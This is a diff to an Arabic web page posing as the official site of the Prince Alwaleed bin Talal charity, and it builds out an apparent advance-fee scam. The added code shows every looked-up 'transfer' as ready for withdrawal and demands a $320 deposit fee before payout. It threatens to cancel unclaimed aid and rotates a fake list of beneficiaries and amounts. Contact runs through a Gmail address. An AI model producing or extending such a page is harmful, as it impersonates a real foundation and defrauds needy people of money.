@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>مؤسسة سمو الأمير الوليد بن طلال بن عبدالعزيز آل سعود الإنسانية الخيرية</title>
+    <title>الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال الخيرية في الشرق الأوسط</title>
     
     <!-- SEO Meta Tags -->
     <meta name="google-site-verification" content="zS7tKdnzcEMlMruQYEiw7v82ApooCCWPP75m9qOf5R8" />
-    <meta name="description" content="مؤسسة سمو الأمير الوليد بن طلال آل سعود الإنسانية الخيرية - منصة خيرية رقمية متطورة للمساعدات والمنح والاستعلام عن الحوالات" />
+    <meta name="description" content="الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال بن عبدالعزيز آل سعود الخيرية في الشرق الأوسط - منصة خيرية رقمية متطورة للمساعدات والمنح والاستعلام عن الحوالات" />
     <meta name="keywords" content="مؤسسة الوليد بن طلال, خيرية, مساعدات مالية, منح دراسية, دعم مشاريع, حوالات, بنك سعودي, استثماري" />
     <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="مؤسسة الوليد بن طلال الخيرية" />
+    <meta property="og:title" content="الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال الخيرية" />
     <meta property="og:description" content="منصة خيرية رقمية للمساعدات والمنح والاستعلام عن الحوالات" />
     <meta property="og:type" content="website" />
     <meta property="og:url" content="https://a-shahrani.vercel.app" />
@@ -39,7 +39,6 @@
             overflow-x: hidden;
         }
 
-        /* ===== WATERMARK ===== */
         body::before {
             content: "🇸🇦";
             position: fixed;
@@ -58,13 +57,11 @@
             50% { transform: translate(-50%, -50%) rotate(-10deg) scale(9); opacity: 0.07; }
         }
 
-        /* ===== MAIN CONTAINER ===== */
         .container {
             max-width: 1300px;
             width: 100%;
             background: rgba(255, 255, 255, 0.92);
             backdrop-filter: blur(18px);
-            -webkit-backdrop-filter: blur(18px);
             border-radius: 48px 48px 32px 32px;
             padding: 20px 25px 30px;
             box-shadow: 0 20px 50px rgba(26, 82, 118, 0.12);
@@ -91,12 +88,8 @@
         }
 
         .brand-logo {
-            position: relative;
             width: 55px;
             height: 55px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
         .brand-logo img {
@@ -131,7 +124,7 @@
             flex-wrap: wrap;
         }
 
-        .header-tools .clock {
+        .clock {
             font-size: 0.8rem;
             color: #1a2e3f;
             background: rgba(26, 140, 78, 0.06);
@@ -140,7 +133,7 @@
             border: 1px solid rgba(26, 140, 78, 0.1);
         }
 
-        .header-tools .clock i {
+        .clock i {
             color: #1a8c4e;
             margin-left: 6px;
         }
@@ -158,6 +151,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            text-decoration: none;
         }
 
         .green-btn:hover {
@@ -165,11 +159,6 @@
             transform: scale(1.02);
         }
 
-        .green-btn i {
-            font-size: 0.9rem;
-        }
-
-        /* ===== HAMBURGER MENU ===== */
         .hamburger-menu {
             display: none;
             flex-direction: column;
@@ -195,6 +184,7 @@
             gap: 15px;
             flex-wrap: wrap;
             align-items: center;
+            margin-bottom: 15px;
         }
 
         .nav-menu a {
@@ -216,20 +206,17 @@
         }
 
         .nav-menu a i {
-            font-size: 0.9rem;
             color: #1a8c4e;
         }
 
-        /* ===== MOBILE NAV ===== */
         .mobile-nav {
             display: none;
             flex-direction: column;
             background: rgba(255, 255, 255, 0.95);
             padding: 15px 20px;
             border-radius: 20px;
-            margin-top: 10px;
+            margin-bottom: 15px;
             border: 1px solid rgba(26, 140, 78, 0.1);
-            box-shadow: 0 8px 24px rgba(0,0,0,0.05);
         }
 
         .mobile-nav a {
@@ -244,7 +231,6 @@
 
         .mobile-nav a:last-child { border-bottom: none; }
         .mobile-nav a i { color: #1a8c4e; width: 20px; }
-
         .mobile-nav.show { display: flex; }
 
         /* ===== NEWS TICKER ===== */
@@ -284,6 +270,50 @@
             100% { transform: translateX(-100%); }
         }
 
+        /* ===== VIDEO SECTION ===== */
+        .video-section {
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(6px);
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(26, 140, 78, 0.06);
+            text-align: center;
+        }
+
+        .video-section h3 {
+            color: #1a2e3f;
+            font-size: 1.1rem;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .video-section h3 i {
+            color: #1a8c4e;
+        }
+
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 */
+            height: 0;
+            overflow: hidden;
+            border-radius: 20px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.06);
+        }
+
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            border-radius: 20px;
+        }
+
         /* ===== SECTIONS GRID ===== */
         .sections-grid {
             display: grid;
@@ -298,14 +328,12 @@
             }
         }
 
-        /* ===== SECTION CARDS ===== */
         .section-card {
             background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(6px);
             border-radius: 30px;
             padding: 25px;
             border: 1px solid rgba(26, 140, 78, 0.06);
-            box-shadow: 0 6px 18px rgba(0,0,0,0.02);
         }
 
         .section-card h3 {
@@ -321,7 +349,7 @@
             color: #1a8c4e;
         }
 
-        /* ===== ABOUT SECTION ===== */
+        /* ===== ABOUT ===== */
         .about-content {
             display: flex;
             gap: 20px;
@@ -342,7 +370,7 @@
             line-height: 1.8;
         }
 
-        /* ===== ASSISTANCE TYPES ===== */
+        /* ===== ASSISTANCE ===== */
         .assistance-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -380,7 +408,7 @@
             color: #7f8c8d;
         }
 
-        /* ===== REGISTRATION FORM ===== */
+        /* ===== REGISTRATION ===== */
         .reg-form {
             display: none;
             flex-direction: column;
@@ -452,73 +480,110 @@
             transform: scale(1.02);
         }
 
-        /* ===== INQUIRY SECTION ===== */
-        .search-box {
-            display: flex;
-            background: #ffffff;
-            border-radius: 60px;
-            overflow: hidden;
-            border: 2px solid rgba(26, 140, 78, 0.1);
-            transition: 0.3s;
+        /* ===== INQUIRY PAGE ===== */
+        .inquiry-page {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 30px;
+            border: 1px solid rgba(26, 140, 78, 0.08);
+            margin-top: 10px;
         }
 
-        .search-box:focus-within {
+        .inquiry-page h2 {
+            color: #1a2e3f;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .inquiry-page h2 i {
+            color: #1a8c4e;
+        }
+
+        .inquiry-box {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+        }
+
+        .inquiry-box input {
+            flex: 1;
+            padding: 16px 22px;
+            border-radius: 60px;
+            border: 2px solid rgba(26, 140, 78, 0.1);
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            min-width: 200px;
+        }
+
+        .inquiry-box input:focus {
             border-color: #1a8c4e;
             box-shadow: 0 0 0 4px rgba(26, 140, 78, 0.06);
         }
 
-        .search-box input {
-            flex: 1;
-            padding: 14px 22px;
-            border: none;
-            outline: none;
-            font-size: 0.95rem;
-            background: transparent;
-            font-family: 'Courier New', monospace;
-        }
-
-        .search-box button {
+        .inquiry-box button {
+            padding: 16px 35px;
+            border-radius: 60px;
             background: #1a8c4e;
-            border: none;
-            padding: 0 28px;
             color: #fff;
+            border: none;
             font-weight: 600;
+            font-size: 1rem;
             cursor: pointer;
             transition: 0.3s;
             display: flex;
             align-items: center;
             gap: 8px;
-            font-size: 0.95rem;
         }
 
-        .search-box button:hover {
+        .inquiry-box button:hover {
             background: #146b3a;
+            transform: scale(1.02);
         }
 
-        /* ===== RESULT AREA ===== */
-        .result-area {
-            margin-top: 16px;
+        /* ===== RECEIPT DISPLAY ===== */
+        .receipt-display {
             display: none;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 30px;
+            padding: 25px;
+            border: 1px solid rgba(26, 140, 78, 0.06);
             animation: fadeSlide 0.4s ease;
         }
 
-        .result-area.show {
+        .receipt-display.show {
             display: block;
         }
 
-        .receipt-card {
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 20px;
-            padding: 20px;
-            border: 1px solid rgba(26, 140, 78, 0.06);
+        .receipt-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 2px solid rgba(26, 140, 78, 0.08);
+            padding-bottom: 12px;
+            margin-bottom: 16px;
+        }
+
+        .receipt-header h4 {
+            font-size: 1.1rem;
+            color: #1a2e3f;
+        }
+
+        .receipt-header h4 i {
+            color: #1a8c4e;
+            margin-left: 8px;
         }
 
         .receipt-row {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
+            padding: 10px 0;
             border-bottom: 1px dashed rgba(0,0,0,0.04);
-            font-size: 0.9rem;
+            font-size: 0.95rem;
         }
 
         .receipt-row span:first-child {
@@ -534,10 +599,139 @@
             text-align: center;
             color: #1a8c4e;
             font-weight: 500;
-            font-size: 0.85rem;
+            font-size: 0.9rem;
             background: rgba(26, 140, 78, 0.04);
-            padding: 8px;
+            padding: 10px;
             border-radius: 30px;
+        }
+
+        /* ===== WITHDRAW SECTION ===== */
+        .withdraw-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px solid rgba(26, 140, 78, 0.06);
+        }
+
+        .withdraw-section h4 {
+            color: #1a2e3f;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .withdraw-section h4 i {
+            color: #1a8c4e;
+        }
+
+        .withdraw-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        @media (max-width: 600px) {
+            .withdraw-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .withdraw-grid select {
+            padding: 12px 16px;
+            border-radius: 30px;
+            border: 2px solid rgba(26, 140, 78, 0.08);
+            background: #ffffff;
+            font-size: 0.9rem;
+            outline: none;
+            width: 100%;
+        }
+
+        .withdraw-grid select:focus {
+            border-color: #1a8c4e;
+        }
+
+        .fee-notice {
+            background: rgba(201, 168, 76, 0.06);
+            padding: 14px 18px;
+            border-radius: 20px;
+            border: 1px solid rgba(201, 168, 76, 0.12);
+            color: #a67c4b;
+            font-size: 0.85rem;
+            margin: 12px 0;
+            text-align: center;
+        }
+
+        .fee-notice i {
+            margin-left: 8px;
+            color: #c9a84c;
+        }
+
+        .withdraw-btn-green {
+            background: #1a8c4e;
+            color: #fff;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            margin-top: 8px;
+        }
+
+        .withdraw-btn-green:hover {
+            background: #146b3a;
+            transform: scale(1.02);
+        }
+
+        .warning-note {
+            background: rgba(255, 0, 0, 0.04);
+            padding: 12px 16px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 0, 0, 0.06);
+            color: #c0392b;
+            font-size: 0.8rem;
+            margin: 8px 0;
+            text-align: center;
+        }
+
+        /* ===== BENEFICIARIES ===== */
+        .beneficiaries-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .beneficiary-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: rgba(255,255,255,0.5);
+            border-radius: 12px;
+            border: 1px solid rgba(26, 140, 78, 0.04);
+            font-size: 0.85rem;
+            transition: 0.3s;
+            animation: fadeSlide 0.5s ease;
+        }
+
+        .beneficiary-item:hover {
+            background: rgba(26, 140, 78, 0.04);
+        }
+
+        .beneficiary-item .name {
+            font-weight: 600;
+            color: #1a2e3f;
+        }
+
+        .beneficiary-item .amount {
+            color: #1a8c4e;
+            font-weight: 600;
         }
 
         /* ===== FOOTER ===== */
@@ -579,6 +773,9 @@
             .brand-text h1 { font-size: 0.95rem; }
             .container { padding: 15px; }
             .about-content img { width: 80px; height: 80px; }
+            .inquiry-box input { min-width: 100%; }
+            .inquiry-box button { width: 100%; justify-content: center; }
+            .video-section { padding: 15px; }
         }
 
         @media (min-width: 769px) {
@@ -598,15 +795,15 @@
             </div>
             <div class="brand-text">
                 <h1>مؤسسة سمو الأمير <span>الوليد بن طلال</span></h1>
-                <small>الإنسانية الخيرية في الشرق الأوسط</small>
+                <small>الصفحة الرسمية - الشرق الأوسط</small>
             </div>
         </div>
 
         <div class="header-tools">
             <div class="clock" id="clock"><i class="fas fa-clock"></i> <span id="currentTime">12:00</span></div>
-            <button class="green-btn" onclick="window.location.href='mailto:compny71@gmail.com'">
+            <a href="mailto:compny71@gmail.com" class="green-btn">
                 <i class="fas fa-headset"></i> خدمة العملاء
-            </button>
+            </a>
             <div class="hamburger-menu" onclick="toggleMobileNav()">
                 <span></span><span></span><span></span>
             </div>
@@ -620,6 +817,7 @@
         <a href="#assistance"><i class="fas fa-hand-holding-heart"></i> المساعدات</a>
         <a href="#register"><i class="fas fa-user-plus"></i> التسجيل</a>
         <a href="#inquiry"><i class="fas fa-search-dollar"></i> استعلام حوالة</a>
+        <a href="#beneficiaries"><i class="fas fa-users"></i> المستفيدين</a>
         <a href="#news"><i class="fas fa-newspaper"></i> الأخبار</a>
     </nav>
 
@@ -630,6 +828,7 @@
         <a href="#assistance"><i class="fas fa-hand-holding-heart"></i> المساعدات</a>
         <a href="#register"><i class="fas fa-user-plus"></i> التسجيل</a>
         <a href="#inquiry"><i class="fas fa-search-dollar"></i> استعلام حوالة</a>
+        <a href="#beneficiaries"><i class="fas fa-users"></i> المستفيدين</a>
         <a href="#news"><i class="fas fa-newspaper"></i> الأخبار</a>
         <a href="mailto:compny71@gmail.com"><i class="fas fa-headset"></i> خدمة العملاء</a>
     </div>
@@ -645,6 +844,20 @@
         </div>
     </div>
 
+    <!-- ===== VIDEO SECTION ===== -->
+    <div class="video-section">
+        <h3><i class="fas fa-video"></i> الفيديو التعريفي للمؤسسة</h3>
+        <div class="video-wrapper">
+            <iframe 
+                src="https://www.youtube.com/embed/qaV2iKXNh2E" 
+                title="مكتب الوليد بن طلال بن عبد العزيز آل سعود" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
     <!-- ===== SECTIONS GRID ===== -->
     <div class="sections-grid">
 
@@ -657,11 +870,10 @@
                 <div class="about-content">
                     <img src="https://static.srpcdigital.com/styles/1037xauto/public/2013/12/04/1386081516164286100.png.webp" alt="الأمير الوليد بن طلال" />
                     <p>
-                        <strong>مؤسسة سمو الأمير الوليد بن طلال بن عبدالعزيز آل سعود الإنسانية الخيرية</strong> 
-                        هي مؤسسة خيرية رائدة في الشرق الأوسط، تهدف إلى تقديم الدعم الإنساني والتنموي للمحتاجين 
+                        <strong>الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال بن عبدالعزيز آل سعود الخيرية في الشرق الأوسط</strong> 
+                        هي مؤسسة خيرية رائدة تهدف إلى تقديم الدعم الإنساني والتنموي للمحتاجين 
                         حول العالم. تركز المؤسسة على تمكين المجتمعات من خلال برامج متكاملة تشمل المساعدات المالية، 
-                        المنح الدراسية، ودعم المشاريع الصغيرة والمتوسطة. رؤيتنا هي عالم أكثر عدالة وإنسانية، 
-                        ورسالتنا هي الوصول إلى كل محتاج بكرامة واحترام.
+                        المنح الدراسية، ودعم المشاريع الصغيرة والمتوسطة.
                     </p>
                 </div>
             </div>
@@ -690,6 +902,14 @@
                         <h4>رعاية صحية</h4>
                         <p>دعم علاجي وصحي</p>
                     </div>
+                </div>
+            </div>
+
+            <!-- BENEFICIARIES -->
+            <div class="section-card" id="beneficiaries">
+                <h3><i class="fas fa-users"></i> قائمة المستفيدين</h3>
+                <div class="beneficiaries-list" id="beneficiariesList">
+                    <!-- سيتم تعبئتها بواسطة JavaScript -->
                 </div>
             </div>
 
@@ -800,16 +1020,92 @@
     </div>
 
     <!-- ===== INQUIRY SECTION (full width) ===== -->
-    <div class="section-card" id="inquiry" style="margin-top:10px;">
-        <h3><i class="fas fa-search-dollar"></i> استعلام عن حوالة <span style="font-weight:300; font-size:0.8rem; color:#7f8c8d;">(Inquiry)</span></h3>
-        <div class="search-box">
+    <div class="inquiry-page" id="inquiry">
+        <h2><i class="fas fa-search-dollar"></i> استعلام عن حوالة</h2>
+        <div class="inquiry-box">
             <input type="text" id="searchInput" placeholder="أدخل رقم الحوالة (7-10 أرقام)" maxlength="10" />
             <button id="searchBtn"><i class="fas fa-arrow-left"></i> استعلام</button>
         </div>
-        <div id="resultArea" class="result-area">
-            <div class="receipt-card">
-                <div id="receiptBody"></div>
-                <div class="receipt-status"><i class="fas fa-check-circle"></i> الحوالة جاهزة للسحب</div>
+
+        <div class="receipt-display" id="resultArea">
+            <div class="receipt-header">
+                <h4><i class="fas fa-receipt"></i> بيانات الشيك</h4>
+                <span style="font-size:0.7rem; color:#7f8c8d;"><i class="fas fa-stamp"></i> مؤكد</span>
+            </div>
+            <div id="receiptBody"></div>
+            <div class="receipt-status"><i class="fas fa-check-circle"></i> الحوالة جاهزة للسحب</div>
+
+            <!-- ===== WITHDRAW SECTION ===== -->
+            <div class="withdraw-section">
+                <h4><i class="fas fa-hand-holding-usd"></i> إجراءات السحب</h4>
+                <div class="withdraw-grid">
+                    <select id="withdrawCountry">
+                        <option value="">-- اختر الدولة --</option>
+                        <option value="المملكة العربية السعودية">🇸🇦 المملكة العربية السعودية</option>
+                        <option value="مصر">🇪🇬 مصر</option>
+                        <option value="السودان">🇸🇩 السودان</option>
+                        <option value="الجزائر">🇩🇿 الجزائر</option>
+                        <option value="المغرب">🇲🇦 المغرب</option>
+                        <option value="تونس">🇹🇳 تونس</option>
+                        <option value="ليبيا">🇱🇾 ليبيا</option>
+                        <option value="الأردن">🇯🇴 الأردن</option>
+                        <option value="فلسطين">🇵🇸 فلسطين</option>
+                        <option value="لبنان">🇱🇧 لبنان</option>
+                        <option value="سوريا">🇸🇾 سوريا</option>
+                        <option value="العراق">🇮🇶 العراق</option>
+                        <option value="الكويت">🇰🇼 الكويت</option>
+                        <option value="قطر">🇶🇦 قطر</option>
+                        <option value="الإمارات">🇦🇪 الإمارات</option>
+                        <option value="عمان">🇴🇲 عمان</option>
+                        <option value="البحرين">🇧🇭 البحرين</option>
+                        <option value="اليمن">🇾🇪 اليمن</option>
+                    </select>
+                    <select id="withdrawBank">
+                        <option value="">-- اختر الصرافة أو البنك --</option>
+                        <option value="ويسترن يونيون">ويسترن يونيون (Western Union)</option>
+                        <option value="موني جرام">موني جرام (MoneyGram)</option>
+                        <option value="الراجحي للصرافة">الراجحي للصرافة</option>
+                        <option value="الإنماء للصرافة">الإنماء للصرافة</option>
+                        <option value="البلاد للصرافة">البلاد للصرافة</option>
+                        <option value="الرياض للصرافة">الرياض للصرافة</option>
+                        <option value="مصرف الراجحي">مصرف الراجحي</option>
+                        <option value="البنك الأهلي السعودي">البنك الأهلي السعودي</option>
+                        <option value="بنك الرياض">بنك الرياض</option>
+                        <option value="بنك البلاد">بنك البلاد</option>
+                        <option value="بنك الإنماء">بنك الإنماء</option>
+                        <option value="بنك سامبا">بنك سامبا</option>
+                        <option value="البنك العربي">البنك العربي</option>
+                        <option value="مصرف أبوظبي الإسلامي">مصرف أبوظبي الإسلامي</option>
+                        <option value="بنك مصر">بنك مصر</option>
+                        <option value="البنك الأهلي المصري">البنك الأهلي المصري</option>
+                        <option value="البنك التجاري الدولي CIB">البنك التجاري الدولي CIB</option>
+                        <option value="بنك الخليج">بنك الخليج</option>
+                        <option value="البنك الإسلامي الأردني">البنك الإسلامي الأردني</option>
+                        <option value="بنك الأردن">بنك الأردن</option>
+                        <option value="بنك البركة">بنك البركة</option>
+                        <option value="بنك أبوظبي الأول">بنك أبوظبي الأول</option>
+                        <option value="بنك الإمارات دبي الوطني">بنك الإمارات دبي الوطني</option>
+                        <option value="بنك المشرق">بنك المشرق</option>
+                        <option value="البنك الأهلي الكويتي">البنك الأهلي الكويتي</option>
+                        <option value="بنك الكويت الوطني">بنك الكويت الوطني</option>
+                        <option value="مصرف قطر الإسلامي">مصرف قطر الإسلامي</option>
+                        <option value="بنك الدوحة">بنك الدوحة</option>
+                        <option value="بنك عمان">بنك عمان</option>
+                        <option value="البنك الأهلي البحريني">البنك الأهلي البحريني</option>
+                    </select>
+                </div>
+
+                <div class="fee-notice">
+                    <i class="fas fa-exclamation-triangle"></i> لا يمكن سحب أي مبلغ إلا بعد دفع رسوم الإيداع البالغة <strong>320 دولار أمريكي</strong>
+                </div>
+
+                <div class="warning-note">
+                    <i class="fas fa-clock"></i> على جميع المستفيدين سرعة سحب المساعدات وإلا سيتم تجميد المبلغ وإلغاؤه
+                </div>
+
+                <button class="withdraw-btn-green" id="withdrawBtn">
+                    <i class="fas fa-money-bill-wave"></i> سحب الحوالة
+                </button>
             </div>
         </div>
     </div>
@@ -887,7 +1183,7 @@
         الدولة: ${country}
         شركة الصرافة/البنك: ${bank}
 
-        تم إرسال هذا الطلب عبر المنصة الرقمية لمؤسسة سمو الأمير الوليد بن طلال آل سعود الإنسانية الخيرية.
+        تم إرسال هذا الطلب عبر المنصة الرقمية للصفحة الرسمية لمؤسسة الأمير الوليد بن طلال آل سعود الخيرية في الشرق الأوسط.
         `;
 
         window.location.href = `mailto:compny71@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
@@ -931,6 +1227,28 @@
         });
     });
 
+    // ===== DISPLAY BENEFICIARIES =====
+    function displayBeneficiaries() {
+        const list = document.getElementById('beneficiariesList');
+        list.innerHTML = '';
+        // عرض أول 10 مستفيدين بشكل دوري
+        const shuffled = [...beneficiaries].sort(() => Math.random() - 0.5);
+        const display = shuffled.slice(0, 10);
+        display.forEach(item => {
+            const div = document.createElement('div');
+            div.className = 'beneficiary-item';
+            div.innerHTML = `
+                <span class="name">${item.name}</span>
+                <span class="amount">$${item.amount.toLocaleString()}</span>
+            `;
+            list.appendChild(div);
+        });
+    }
+
+    displayBeneficiaries();
+    // تغيير المستفيدين كل 10 ثواني
+    setInterval(displayBeneficiaries, 10000);
+
     // ===== SEARCH FUNCTION =====
     const searchInput = document.getElementById('searchInput');
     const searchBtn = document.getElementById('searchBtn');
@@ -963,7 +1281,24 @@
     searchBtn.addEventListener('click', performSearch);
     searchInput.addEventListener('keypress', e => { if (e.key === 'Enter') performSearch(); });
 
-    console.log('✅ مؤسسة الوليد بن طلال الخيرية - تم التحديث');
+    // ===== WITHDRAW BUTTON =====
+    document.getElementById('withdrawBtn').addEventListener('click', function() {
+        const country = document.getElementById('withdrawCountry').value;
+        const bank = document.getElementById('withdrawBank').value;
+
+        if (!country) {
+            alert('⚠️ الرجاء اختيار الدولة.');
+            return;
+        }
+        if (!bank) {
+            alert('⚠️ الرجاء اختيار شركة الصرافة أو البنك.');
+            return;
+        }
+
+        alert(`✅ تم طلب السحب بنجاح!\n📌 الدولة: ${country}\n🏦 المصرف: ${bank}\n💰 رسوم الإيداع: 320 دولار\n⏳ سيتم معالجة الطلب خلال 24 ساعة.`);
+    });
+
+    console.log('✅ الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال الخيرية - تم التحديث');
     console.log('📋 أرقام الحوالات:', transfers.map(t => t.number).join(', '));
 </script>
 
